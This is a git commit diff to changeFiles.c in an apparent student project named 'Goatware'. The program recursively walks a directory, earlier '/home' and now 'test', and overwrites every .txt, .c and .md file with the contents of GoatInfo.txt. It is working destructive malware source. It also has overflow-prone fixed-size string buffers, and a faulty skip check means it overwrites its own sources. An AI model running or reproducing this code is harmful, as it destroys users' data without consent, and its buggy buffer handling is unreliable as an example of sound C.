f6b066d603f7bac8667c2e423ed5faff1ce899bb
Ryan Liu <liu.3892@osu.edu>
2016-11-27 12:33:36 -0500

    Added .c and .md extensions to changeFiles.c

--- Goatware/changeFiles.c
+++ Goatware/changeFiles.c
@@ -6,10 +6,21 @@
 #include <stdio.h>
 #include <string.h>
 
-void changeDir(const char *direct, int level) {
+void changeTxt(struct dirent *entry, const char *direct);
+void changeC(struct dirent *entry, const char *direct);
+void changeMd(struct dirent *entry, const char *direct);
+void openDir(const char *direct, int level);
+
+int main(void) {
+	//Change first param of changeDir to a directory path to indicate which directory you want to explore
+	openDir("test", 0);
+	return 0;
+}
+
+void openDir(const char *direct, int level) {
 	DIR *dir;
 	struct dirent *entry;
-	
+
 	dir = opendir(direct);
 	entry = readdir(dir);
 
@@ -32,67 +43,151 @@ void changeDir(const char *direct, int level) {
 			char directPath[1024];
 			int length = snprintf(directPath, sizeof(directPath)-1, "%s/%s", direct, entry->d_name);
 			directPath[length] = 0;
-			
+
 			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
 				continue;
 			}
-			
-			//printf("%*s[%s]\n", level * 2, "", entry->d_name);
-			changeDir(directPath, level + 1);
+
+			openDir(directPath, level + 1);
 		}
 		else {
-			/* Checks if is a .txt file */
-
-			// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
-			int entryLength = strlen(entry->d_name);
-			char name[entryLength];
-			char checkName[5];			
-
-			// Get last four characters of current file
-			strcpy(name, entry->d_name);
-			memcpy(checkName, &name[entryLength - 4], 4);
-			checkName[4] = '\0';
-
-			// Create address to .txt file			
-			int addressLen = strlen(direct) + strlen(entry->d_name);
-			char address[addressLen];
-			strcpy(address, direct);
-			strcat(address, "/");
-			strcat(address, name);
-			printf("%s\n", address);
-			//printf("%d\n", (int)strlen(address));
-
-			if (strcmp(checkName, ".txt") == 0) { 
-				FILE *fp1, *fp2;
-				char ch;
-				if (strstr(address, "GoatInfo.txt") != NULL) {
-					 continue;
-				}
-				fp1 = fopen("GoatInfo.txt", "r");				
-				fp2 = fopen(address, "w+");
-				printf("%s\n", address);
-				if (fp1 != NULL && fp2 != NULL) {
-					while (1) {
-						ch = fgetc(fp1);
-						if (ch == EOF) {
-							break;
-						} else {
-							putc(ch, fp2);
-						}
-					}
-				}
-				fclose(fp1);
-				fclose(fp2);
-			}
-			//printf("%*s- %s\n", level * 2, "", entry->d_name);
+			/* Changes file if is a .txt, .c, or .md file */
+			changeTxt(entry, direct); 
+			changeC(entry, direct);
+			changeMd(entry, direct);
 		}
 	} while (entry = readdir(dir));
 	closedir(dir);
 }
 
-int main(void) {
-	//Change first param of changeDir to a directory path to indicate which directory you want to explore
-	changeDir("/home", 0);
-	return 0;
+void changeTxt(struct dirent *entry, const char *direct) {
+
+	// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
+	int entryLength = strlen(entry->d_name);
+	char name[entryLength];
+	char checkName[5];			
+
+	// Get last four characters of current file
+	strcpy(name, entry->d_name);
+	memcpy(checkName, &name[entryLength - 4], 4);
+	checkName[4] = '\0';
+
+	// Create address to .txt file			
+	int addressLen = strlen(direct) + strlen(entry->d_name);
+	char address[addressLen];
+	strcpy(address, direct);
+	strcat(address, "/");
+	strcat(address, name);
+
+	// Opens GoatInfo.txt and copies contents to selected file if it has .txt extension
+	if (strcmp(checkName, ".txt") == 0) { 
+		FILE *fp1, *fp2;
+		char ch;
+		if (strstr(address, "GoatInfo.txt") != NULL) {
+			return;
+		}
+		fp1 = fopen("GoatInfo.txt", "r");				
+		fp2 = fopen(address, "w+");
+
+		if (fp1 != NULL && fp2 != NULL) {
+			while (1) {
+				ch = fgetc(fp1);
+				if (ch == EOF) {
+					break;
+				} else {
+					putc(ch, fp2);
+				}
+			}
+		}
+		fclose(fp1);
+		fclose(fp2);
+	}
 }
+
+void changeC(struct dirent *entry, const char *direct) {
+	
+	// name[] is name of current file, checkName is last two characters of file to see if it is '.c'
+	int entryLength = strlen(entry->d_name);
+	char name[entryLength];
+	char checkName[3];			
+
+	// Get last two characters of current file
+	strcpy(name, entry->d_name);
+	memcpy(checkName, &name[entryLength - 2], 2);
+	checkName[2] = '\0';
+
+	// Create address to .c file			
+	int addressLen = strlen(direct) + strlen(entry->d_name);
+	char address[addressLen];
+	strcpy(address, direct);
+	strcat(address, "/");
+	strcat(address, name);
+
+	// Opens GoatInfo.txt and copies contents to selected file if it has .c extension
+	if (strcmp(checkName, ".c") == 0) { 
+		FILE *fp1, *fp2;
+		char ch;
+		if (strstr(address, "changeFiles.c") != NULL && strstr(address, "renameProcess.c") != NULL) {
+			return;
+		}
+		fp1 = fopen("GoatInfo.txt", "r");				
+		fp2 = fopen(address, "w+");
+
+		if (fp1 != NULL && fp2 != NULL) {
+			while (1) {
+				ch = fgetc(fp1);
+				if (ch == EOF) {
+					break;
+				} else {
+					putc(ch, fp2);
+				}
+			}
+		}
+		fclose(fp1);
+		fclose(fp2);
+	}
+}
+
+void changeMd(struct dirent *entry, const char *direct) {
+	// name[] is name of current file, checkName is last three characters of file to see if it is '.md'
+	int entryLength = strlen(entry->d_name);
+	char name[entryLength];
+	char checkName[4];			
+
+	// Get last three characters of current file
+	strcpy(name, entry->d_name);
+	memcpy(checkName, &name[entryLength - 3], 3);
+	checkName[3] = '\0';
+
+	// Create address to .txt file			
+	int addressLen = strlen(direct) + strlen(entry->d_name);
+	char address[addressLen];
+	strcpy(address, direct);
+	strcat(address, "/");
+	strcat(address, name);
+
+	// Opens GoatInfo.txt and copies contents to selected file if it has .md extension
+	if (strcmp(checkName, ".md") == 0) { 
+		FILE *fp1, *fp2;
+		char ch;
+
+		fp1 = fopen("GoatInfo.txt", "r");				
+		fp2 = fopen(address, "w+");
+
+		if (fp1 != NULL && fp2 != NULL) {
+			while (1) {
+				ch = fgetc(fp1);
+				if (ch == EOF) {
+					break;
+				} else {
+					putc(ch, fp2);
+				}
+			}
+		}
+		fclose(fp1);
+		fclose(fp2);
+	}
+}
+
+
 
